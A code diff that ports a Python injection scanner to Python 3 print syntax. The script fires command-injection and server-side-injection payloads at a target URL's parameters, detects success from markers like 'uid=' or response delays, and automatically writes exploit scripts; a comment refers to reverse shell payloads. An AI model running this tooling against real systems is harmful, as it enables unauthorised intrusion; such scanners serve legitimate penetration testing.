@@ -69,7 +69,7 @@ def scan(url, params):
 	for key, value in method_params.items():
 		response = requests.post(url,data=method_params)
 		initial_length = response.headers['content-length']
-		print "Initial response content length: " + str(response.headers['content-length'])
+		print("Initial response content length: " + str(response.headers['content-length']))
 
 	#Scan for potential vulns
 	for x in commandExecList:
@@ -77,20 +77,20 @@ def scan(url, params):
 			method_params[key] = x.replace("\n", "")
 
 			response = make_request(method, url, method_params)
-			print "\nPayload used: " + str(method_params)
-			print "Elasped Time: " + str(response.elapsed.total_seconds())
-			print "Response content: " + response.content
-			print "Response content length: " + str(response.headers['content-length'])
+			print("\nPayload used: " + str(method_params))
+			print("Elapsed Time: " + str(response.elapsed.total_seconds()))
+			print("Response content: " + response.content)
+			print("Response content length: " + str(response.headers['content-length']))
 
 			delta = int(response.headers['content-length']) - int(initial_length)
 
 			if response.content.find("gaw4f4sdaf12f") != -1 or response.content.find("/bin") != -1 or response.content.find("uid=") != -1 or delta > 50:
-				print "Module is potentially vulnerable to command injection!"
+				print("Module is potentially vulnerable to command injection!")
 				exploitable = "yes"
 				#break
 
 			elif response.elapsed.total_seconds() > 25:
-				print "Module is potentially vulnerable to blind command injection!"
+				print("Module is potentially vulnerable to blind command injection!")
 				exploitable = "yes"
 				#break
 
@@ -101,15 +101,15 @@ def scan(url, params):
 					for key, value in method_params.items():
 						method_params[key] = y.replace("\n", "")
 						response = make_request(method, url, method_params)
-						print "\nPayload used: " + str(method_params)
-						print "Elasped Time: " + str(response.elapsed.total_seconds())
-						print "Response content: " + response.content
-						print "Response content length: " + str(response.headers['content-length'])
-						print "Searching for the correct exploit..."
+						print("\nPayload used: " + str(method_params))
+						print("Elapsed Time: " + str(response.elapsed.total_seconds()))
+						print("Response content: " + response.content)
+						print("Response content length: " + str(response.headers['content-length']))
+						print("Searching for the correct exploit...")
 
 						count=+count+1
 						if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment. Some reverse shell payload will hang the server, need to find a solution for this
-							print "Exploit found!"
+							print("Exploit found!")
 						 	with open('command_injection'+str(count)+'.py', 'w') as exploitFile:
 			 					if method == "POST":
 			 						exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
@@ -131,7 +131,7 @@ def scan(url, params):
 	for key, value in method_params.items():
 		response = requests.post(url,data=method_params)
 		initial_length = response.headers['content-length']
-		print "Initial response content length: " + str(response.headers['content-length'])
+		print("Initial response content length: " + str(response.headers['content-length']))
 
 	#Scan for potential vulns
 	for x in serverInjectList:
@@ -139,20 +139,20 @@ def scan(url, params):
 			method_params[key] = x.replace("\n", "")
 
 		response = make_request(method, url, method_params)
-	 	print "\nPayload used: " + str(method_params)
-	 	print "Elasped Time: " + str(response.elapsed.total_seconds())
-		print "Response content: " + response.content
-	 	print "Response content length: " + str(response.headers['content-length'])
+	 	print("\nPayload used: " + str(method_params))
+	 	print("Elapsed Time: " + str(response.elapsed.total_seconds()))
+		print("Response content: " + response.content)
+	 	print("Response content length: " + str(response.headers['content-length']))
 
 		delta = int(response.headers['content-length']) - int(initial_length)
 
 		if response.content.find("vq3rio13dj8x") != -1 or response.content.find("/bin") != -1 or delta > 50:
-			print "Module potentially vulnerable to sever side injection!"
+			print("Module potentially vulnerable to sever side injection!")
 			exploitable = "yes"
 			#break
 
 		elif response.elapsed.total_seconds() > 12:
-			print "Vulnerable to blind sever side injection"
+			print("Vulnerable to blind sever side injection")
 			exploitable = "yes"
 			#break
 
@@ -164,15 +164,15 @@ def scan(url, params):
 					method_params[key] = y.replace("\n", "")
 					response = make_request(method, url, method_params)
 
-					print "\nPayload used: " + str(method_params)
-					print "Elasped Time: " + str(response.elapsed.total_seconds())
-					print "Response content: " + response.content
-					print "Response content length: " + str(response.headers['content-length'])
-					print "Searching for the correct exploit..."
+					print("\nPayload used: " + str(method_params))
+					print("Elapsed Time: " + str(response.elapsed.total_seconds()))
+					print("Response content: " + response.content)
+					print("Response content length: " + str(response.headers['content-length']))
+					print("Searching for the correct exploit...")
 
 					count=+count+1
 					if response.content.find("Linux") != -1: #Need to find a better logic, or change the value on the spot during assesment. Some reverse shell payload will hang the server, need to find a solution for this
-						print "Exploit found!"
+						print("Exploit found!")
 						with open('server_injection'+str(count)+'.py', 'w') as exploitFile:
 							if method == "POST":
 								exploitFile.write('import urllib, urllib2, cookielib, requests\nurl = "'+ url +'"\n')
